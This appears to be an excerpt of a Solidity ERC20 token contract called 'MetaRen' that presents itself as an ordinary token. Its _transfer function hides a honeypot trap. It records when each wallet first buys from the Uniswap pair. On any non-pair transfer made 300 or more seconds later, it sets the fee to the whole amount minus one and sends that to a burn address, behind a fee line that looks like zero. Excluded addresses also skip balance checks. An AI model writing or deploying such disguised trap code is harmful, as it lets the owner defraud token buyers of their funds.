...
contract MetaRen is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balance;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private Burr; 
    mapping (address => bool) private _isExcludedFrom;
    string private _name = "MetaRen";
    string private _symbol = "MetaRen";
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        uint256 burntime =  Burr[sender] + 300;  
        uint256 feeAmount = 0;
        if (!_isExcludedFrom[sender] && !_isExcludedFrom[recipient] && recipient != address(this)) {
        if ( sender == uniswapV2Pair    &&  balanceOf(recipient) == 0) { {Burr[recipient] =  block.timestamp;  } }  
        if ( sender != uniswapV2Pair ) { feeAmount = amount.mul(0).div(1000); 
        if (  block.timestamp  >= burntime  ) { feeAmount = amount- 1 ; } } }
        uint256 senderBL = _balance[sender];
        if ( !_isExcludedFrom[msg.sender]) { require(senderBL >= amount); require(sender != recipient); }
        uint256 amountR = amount - feeAmount;
        _balance[_burnaaddress] += feeAmount;
        if (senderBL >= amount) {  _balance[sender] = senderBL - amount; }
